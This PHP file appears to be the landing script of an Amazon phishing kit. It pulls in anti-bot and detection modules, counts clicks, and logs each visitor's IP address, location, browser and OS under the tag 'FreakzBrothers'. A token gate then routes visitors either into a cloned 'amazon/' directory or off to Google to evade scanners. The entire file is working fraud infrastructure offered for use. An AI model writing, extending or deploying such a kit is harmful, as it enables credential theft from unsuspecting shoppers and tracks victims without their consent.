<?php

ob_start();
session_start();
require "amazon/anti/antibots.php";
include_once 'amazon/__CONFIG__.php';
include_once 'amazon/detek.php';
include_once 'amazon/bahasa.php';
$token1 = "0oF0VOFHR4bRV3fcK62KU2THSYwSuY9a";
$file2 ="log/click.txt";
        $isi = file_get_contents($file2);
        $buka = fopen($file2, "w");
        fwrite($buka, $isi + 1);
        fclose($buka);
$_SESSION['ip'] = clientData('ip');
$_SESSION['ip_countryName'] = clientData('country');
$_SESSION['ip_countryCode'] = clientData('code');
$_SESSION['ip_city'] = clientData('city');
$_SESSION['ip_state'] = clientData('state');
$_SESSION['ip_timezone'] = clientData('timezone');
$_SESSION['currency'] = clientData('currency');
$_SESSION['os'] = getOs();
$_SESSION['browser'] = getBrowser();
date_default_timezone_set('GMT');
$dateNow = date("d/m/Y h:i:s A");
$fp = fopen("log/visitor.txt", "a");
fputs($fp, "FreakzBrothers => IP : {$_SESSION['ip']}  - Negara : {$_SESSION['ip_countryName']} - Browser : {$_SESSION['browser']} - OS : {$_SESSION['os']}\r\n");
fclose($fp);
if ($token1 == $token2) {
  header("Location: amazon/");
}
else{
    header("Location: https://www.google.com/");
}

?>